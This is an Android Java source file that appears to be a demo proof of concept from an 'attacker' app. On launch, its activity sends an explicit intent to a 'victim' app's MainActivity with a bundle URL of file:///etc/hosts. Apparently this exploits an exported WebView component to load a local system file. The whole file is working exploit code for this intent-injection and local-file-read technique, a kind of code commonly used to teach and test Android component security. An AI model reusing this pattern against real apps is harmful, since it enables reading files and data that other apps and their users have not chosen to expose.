package com.demo.attacker;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    public static final String LOAD_URL="file:///etc/hosts";
//    public static final String BAIDU="https://www.baidu.com";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ComponentName componentName = new ComponentName("com.demo.victim","com.demo.victim.MainActivity");
        Intent intent = new Intent();
        Bundle bundle = new Bundle();
        intent.setComponent(componentName);
        bundle.putString("url",LOAD_URL);
        intent.putExtra("bundle",bundle);
        startActivity(intent);

    }
}
